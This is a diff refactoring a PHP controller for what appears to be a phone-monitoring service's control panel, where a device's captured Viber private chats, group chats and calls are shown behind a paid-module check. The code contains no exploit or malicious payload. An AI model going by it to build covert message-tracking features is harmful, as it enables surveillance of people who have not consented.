@@ -2,47 +2,59 @@
 
 namespace Controllers;
 
-use System\FlashMessages;
+use System\FlashMessages,
+    Models\Modules,
+    CS\Devices\Limitations;
 
-class Viber extends BaseController {
+class Viber extends BaseModuleController
+{
 
-    protected $module = 'viber';
-    
-    protected function init() {
+    protected $module = Modules::VIBER;
+
+    protected function init()
+    {
         parent::init();
 
         $this->initCP();
     }
-    
-    public function indexAction() {
+
+    public function indexAction()
+    {
         $viberModel = new \Models\Cp\Viber($this->di);
 
-        if ($this->isAjaxRequest()) {
-            $dataTableRequest = new \System\DataTableRequest();
+        if ($this->getRequest()->isAjax()) {
+            $dataTableRequest = new \System\DataTableRequest($this->di);
 
-            $dataTableRequest->getRequest($_GET, array('timeFrom', 'timeTo'));
-            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
             switch ($this->params['tab']) {
                 case 'private':
-                    $this->makeJSONResponse($viberModel->getPrivateDataTableData($this->di['devId'], $dataTableRequest->getResult()));
+                    $data = $viberModel->getPrivateDataTableData(
+                            $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
+                    );
                     break;
                 case 'group':
-                    $this->makeJSONResponse($viberModel->getGroupDataTableData($this->di['devId'], $dataTableRequest->getResult()));
+                    $data = $viberModel->getGroupDataTableData(
+                            $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
+                    );
                     break;
                 case 'calls':
-                    $this->makeJSONResponse($viberModel->getCallsDataTableData($this->di['devId'], $dataTableRequest->getResult()));
+                    $data = $viberModel->getCallsDataTableData(
+                            $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
+                    );
                     break;
             }
+            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
+            $this->makeJSONResponse($data);
         }
 
         if ($this->view->paid) {
             $this->view->hasRecords = $viberModel->hasRecords($this->di['devId']);
         }
-        
+
         $this->setView('cp/viber.htm');
     }
 
-    public function listAction() {
+    public function listAction()
+    {
         $viberModel = new \Models\Cp\Viber($this->di);
 
         switch ($this->params['tab']) {
@@ -60,17 +72,24 @@ class Viber extends BaseController {
             $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
             $this->redirect($this->di['router']->getRouteUrl('viber'));
         }
-        
+
         $this->view->tab = $this->params['tab'];
 
         $this->setView('cp/viberList.htm');
     }
-    
-    protected function postAction() {
+
+    protected function postAction()
+    {
         parent::postAction();
         $this->buildCpMenu();
-        
+
         $this->view->title = $this->di['t']->_('Viber Tracking');
+    }
+    
+    protected function isModulePaid()
+    {
+        $devicesLimitations = new Limitations($this->di['db']);
+        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::VIBER);
     }
 
 }
